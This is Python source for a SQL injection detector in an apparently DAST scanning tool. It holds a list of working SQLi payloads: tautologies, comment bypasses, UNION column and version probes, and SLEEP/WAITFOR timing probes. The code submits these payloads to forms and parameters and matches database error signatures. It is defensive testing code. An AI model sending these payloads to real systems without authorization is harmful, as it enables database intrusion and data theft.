"""SQL Injection Detector.

Category: Injection
Evidence Type: DB Error / HTTP Traffic
"""

from __future__ import annotations

import logging
import re
import time
from typing import Any

from dast.detectors.base import BaseDetector
from dast.http_client import HTTPClient
from dast.models import (
    Confidence,
    DetectorCategory,
    DetectorRequirement,
    Endpoint,
    EvidenceType,
    Finding,
    HttpMethod,
    Severity,
)

logger = logging.getLogger(__name__)

SQLI_PAYLOADS = [
    # Basic syntax breaker & Quote escapes
    "'",
    '"',
    "`",
    "')",
    '")',
    "\\",

    # Numeric injection & Boolean logic (DVWA / bWAPP)
    "1 OR 1=1",
    "1 OR 1=1 --",
    "1 OR 1=1#",
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1'#",
    "1' OR 1=1 --",
    "1' OR 1=1#",
    "1' OR 1=1/*",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR '1'='1'#",
    '" OR "1"="1',
    '" OR 1=1 --',
    "1' AND '1'='2",
    "1 AND 1=2",

    # Inline comment and space bypasses (bWAPP Medium / High)
    "1'/**/OR/**/1=1/**/#",
    "1'/**/OR/**/'1'='1",
    "1'/**/UNION/**/SELECT/**/NULL,NULL#",

    # Union based column discovery and extraction
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' UNION SELECT 1,2--",
    "1' UNION SELECT 1,2#",
    "1' UNION SELECT NULL,version()#",
    "1 UNION SELECT 1,2--",

    # Time-based delay (Blind SQLi)
    "' OR SLEEP(2)--",
    "1' AND SLEEP(2)--",
    "1' AND SLEEP(2)#",
    "1; SELECT SLEEP(2)",
    "'; WAITFOR DELAY '0:0:2'--",
    "1' AND (SELECT 1 FROM (SELECT(SLEEP(2)))a)--",
]

# Database syntax error regex signatures
SQLI_ERROR_PATTERNS = [
    # MySQL / MariaDB
    re.compile(r"you have an error in your sql syntax", re.I),
    re.compile(r"warning:\s*mysql_", re.I),
    re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.I),
    re.compile(r"MySqlClient\.", re.I),
    # PostgreSQL
    re.compile(r"pg_query\(\):\s*Query failed:", re.I),
    re.compile(r"ERROR:\s+syntax error at or near", re.I),
    re.compile(r"psycopg2\.errors", re.I),
    re.compile(r"org\.postgresql\.util\.PSQLException", re.I),
    # SQLite
    re.compile(r"sqlite3\.OperationalError", re.I),
    re.compile(r"unrecognized token:", re.I),
    re.compile(r"near \".*\": syntax error", re.I),
    # Microsoft SQL Server
    re.compile(r"Driver.*SQL Server.*Unclosed quotation mark", re.I),
    re.compile(r"Syntax error in string in query expression", re.I),
    re.compile(r"SqlException", re.I),
    # Oracle
    re.compile(r"ORA-\d{5}:", re.I),
    re.compile(r"quoted string not properly terminated", re.I),
    # Generic SQL errors
    re.compile(r"syntax error near", re.I),
    re.compile(r"unclosed quotation mark", re.I),
]


def check_sqli_execution(response_text: str) -> tuple[bool, str, EvidenceType]:
    """Check if response text contains SQL database syntax error or boolean differential."""
    if not response_text:
        return False, "", EvidenceType.DB_ERROR

    for pattern in SQLI_ERROR_PATTERNS:
        match = pattern.search(response_text)
        if match:
            return True, f"Database Error Evidence:\nObserved raw DB error: '{match.group(0)}'", EvidenceType.DB_ERROR

    # Boolean differential check
    if "User not found." in response_text:
        return True, "HTTP Differential Traffic Evidence:\nObserved distinct boolean false response: 'User not found.'", EvidenceType.HTTP_TRAFFIC

    return False, "", EvidenceType.DB_ERROR


class SQLiDetector(BaseDetector):
    """Detects SQL Injection by looping payloads on forms/parameters and stopping on execution."""

    name = "sqli"
    description = "Checks parameters and forms for SQL Injection vulnerabilities"
    category = DetectorCategory.INJECTION
    default_evidence_type = EvidenceType.DB_ERROR
    requirement = DetectorRequirement.BROWSER

    def scan(
        self,
        endpoint: Endpoint,
        client: HTTPClient,
        browser: Any | None = None,
        form_handler: Any | None = None,
        **kwargs: Any,
    ) -> list[Finding]:
        findings: list[Finding] = []

        # 1. Test forms if present on endpoint
        if endpoint.forms:
            for form in endpoint.forms:
                target_field = None
                for inp in form.inputs:
                    if inp.name and inp.input_type.lower() in ("text", "search", "textarea", "input", ""):
                        target_field = inp.name
                        break
                if not target_field:
                    continue

                for payload in SQLI_PAYLOADS:
                    if form_handler:
                        resp_text, shot_path = form_handler.fill_and_submit(
                            form=form,
                            payload=payload,
                            target_input=target_field,
                            detector_name=self.name,
                            client=client,
                            browser=browser,
                        )
                    elif browser and hasattr(browser, "fill_and_submit_form"):
                        companion = {
                            inp.name: inp.value or (inp.name if inp.input_type == "submit" else "")
                            for inp in form.inputs
                            if inp.name and inp.name != target_field
                        }
                        try:
                            resp_text, shot_path = browser.fill_and_submit_form(
                                url=form.action or endpoint.url,
                                target_param=target_field or "id",
                                payload=payload,
                                companion_fields=companion,
                                detector_name=self.name,
                            )
                        except TypeError:
                            resp_text, shot_path = browser.fill_and_submit_form(
                                url=form.action or endpoint.url,
                                target_param=target_field or "id",
                                payload=payload,
                                companion_fields=companion,
                            )
                    else:
                        body = {
                            inp.name: inp.value or (inp.name if inp.input_type == "submit" else "")
                            for inp in form.inputs
                            if inp.name
                        }
                        body[target_field or "id"] = payload
                        if form.method.upper() == "POST":
                            resp, _, _ = client.post(form.action or endpoint.url, data=body)
                        else:
                            resp, _, _ = client.get(form.action or endpoint.url, params=body)
                        resp_text = resp.text if resp else ""
                        shot_path = None

                    is_vuln, ev_text, ev_type = check_sqli_execution(resp_text)
                    if is_vuln:
                        step_shots = []
                        if form_handler and hasattr(form_handler, "save_interaction_steps"):
                            step_shots = form_handler.save_interaction_steps(self.name, browser=browser)
                        elif browser and hasattr(browser, "save_interaction_steps"):
                            step_shots = browser.save_interaction_steps(self.name)

                        shot_path = step_shots[-1] if step_shots else None
                        if not shot_path and browser and hasattr(browser, "capture_step") and browser.is_available:
                            try:
                                shot_path = browser.capture_step(
                                    f"sqli_{target_field}_evidence",
                                    html_content=resp_text,
                                    base_url=form.action or endpoint.url,
                                    detector_name=self.name,
                                )
                            except Exception:
                                shot_path = None

                        findings.append(
                            self.create_finding(
                                title=f"SQL Injection Vulnerability in Form Field '{target_field}'",
                                severity=Severity.HIGH,
                                confidence=Confidence.CERTAIN,
                                url=form.action or endpoint.url,
                                method=form.method,
                                parameter=target_field,
                                evidence=ev_text,
                                evidence_type=ev_type,
                                screenshot_path=shot_path,
                                step_screenshots=step_shots or ([shot_path] if shot_path else []),
                                description=f"Form field '{target_field}' is vulnerable to SQL injection.",
                                remediation="Use parameterized queries / prepared statements with placeholder tokens.",
                            )
                        )
                        break

            if findings:
                return findings

        # 2. Test endpoint parameters directly via HTTP
        param_names = endpoint.get_all_param_names()
        for param in param_names:
            for payload in SQLI_PAYLOADS:
                t0 = time.time()
                if endpoint.method == HttpMethod.POST:
                    body = dict(endpoint.body_params)
                    body[param] = payload
                    resp, req_meta, res_meta = client.post(endpoint.url, data=body)
                else:
                    params = dict(endpoint.params)
                    params[param] = payload
                    resp, req_meta, res_meta = client.get(endpoint.url, params=params)
                elapsed = time.time() - t0

                resp_text = resp.text if resp else ""

                is_vuln, ev_text, ev_type = check_sqli_execution(resp_text)

                # Time-based blind check
                if not is_vuln and "SLEEP" in payload and elapsed >= 1.5:
                    is_vuln = True
                    ev_type = EvidenceType.HTTP_TRAFFIC
                    ev_text = f"HTTP Timing Evidence:\nTime-Based Delay: Server took {elapsed:.2f}s to respond on probe '{payload}'"

                if is_vuln:
                    if "differential" in ev_text.lower() or "boolean" in ev_text.lower():
                        title = f"SQL Injection (Boolean Differential) in Parameter '{param}'"
                    elif "timing" in ev_text.lower() or "time-based" in ev_text.lower():
                        title = f"SQL Injection (Time-Based Delay) in Parameter '{param}'"
                    else:
                        title = f"SQL Injection Vulnerability in Parameter '{param}'"
                    shot_path = None
                    if browser and hasattr(browser, "capture_step"):
                        try:
                            shot_path = browser.capture_step(
                                f"sqli_{param}_evidence",
                                html_content=resp_text,
                                base_url=endpoint.url,
                                detector_name=self.name,
                            )
                        except Exception:
                            try:
                                shot_path = browser.capture_step(
                                    f"sqli_{param}_evidence",
                                    html_content=resp_text,
                                    base_url=endpoint.url,
                                )
                            except Exception:
                                shot_path = None

                    findings.append(
                        self.create_finding(
                            title=title,
                            severity=Severity.HIGH,
                            confidence=Confidence.CERTAIN,
                            url=endpoint.url,
                            method=endpoint.method.value,
                            parameter=param,
                            evidence=ev_text,
                            evidence_type=ev_type,
                            screenshot_path=shot_path,
                            description=f"Parameter '{param}' is vulnerable to SQL injection.",
                            remediation="Use parameterized queries / prepared statements with placeholder tokens.",
                            request_metadata=req_meta,
                            response_metadata=res_meta,
                        )
                    )
                    break

        return findings
